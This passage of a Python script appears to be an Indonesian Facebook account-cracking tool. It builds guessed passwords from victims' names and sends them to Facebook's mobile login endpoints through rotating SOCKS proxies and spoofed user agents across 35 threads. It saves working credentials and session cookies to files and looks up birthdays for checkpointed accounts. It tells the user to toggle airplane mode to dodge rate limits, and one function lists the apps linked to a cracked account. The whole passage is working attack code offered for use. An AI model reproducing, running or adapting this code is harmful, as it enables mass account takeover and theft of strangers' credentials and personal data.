            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                #ua1 = random.choice(agen1)
                #ua2 = random.choice(agen2)
                ua = random.choice(redmi)
              #  uask = random.choice(user_agent)
                #ua= "Mozilla/5.0 (Linux; Android 13; en-us; PixelBuild/QP1A.191005.007.A3; wv) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/85.0.4785.121 Mobile Safari/537.36 Instagram180.0.0.31.119 Android (29/10; 420dpi; 1080x1794; Google/google;Pixel; sailfish; sailfish; en_US; 385416228)"

                ua2 = random.choice(ugen2)
                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                #po = session.post('https://'+cebok+'/login/device-based/-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    ###
                    #os.popen('play-audio ok.mp3')
                    print(f'\r{O}└──> {user} • {pw}')
                    print(f'\r{O}    └──> {coki}')
                    
                    #print(f'{ua}')
                    #cek_apk(coki)
                    wrt = '[Alien-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                   
                  # os.popen('play-audio cp.mp3')
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        
                        print(f'\n{K} └──> {user} • {pw} ')
                        #print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[Alien-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print(f'\r{K}└──> {user} • {pw} ')
                    
                    #print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[Alien-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
            self.__metode__(cebok, user, pasw
            
            )


    def __pler__(self):
        yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        print('%s════════════════════════════════════════\n %sPASSWORD MENU%s'%(N,BM,N))
        print(' %s[%s1%s] nama,nama123,nama12345'%(N,O,N))
        print(' %s[%s2%s] nama,nama123,nama1234,nama12345'%(N,O,N))
        print(' %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%s'%(N,O,N,O,N))
        pw = input(f"\n {N}[{K}?{N}] Choose Password Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,O,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["2","02"]:
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,O,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["3","03"]:
            print('%s════════════════════════════════════════\n %sADDITIONAL PASSWORD MENU%s'%(N,BM,N))
            print(" %s[%s!%s] Use %sKOMMA%s for separator"%(N,M,N,O,N))
            print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,O,N))
            pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,O,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        else:
            print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		#print('\n\r[*]Aplikasi Aktif :\n')
		for i in range(len(game)):
			#print(" \r[•] Aplikasi Aktif :")
			print ("\r        %s%s %s%s"%(x,i+1,H,game[i].
			replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		#print('\n\r[*]Aplikasi Kadaluwarsa:\n')
		for i in range(len(game)):
			#print("\rAplikasi Kadaluwarsa : ")
			print ("\r        %s%s %s%s"%(M,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))	           

if __name__ == '__main__':
     # moch_yayan()
      login()
      
  
  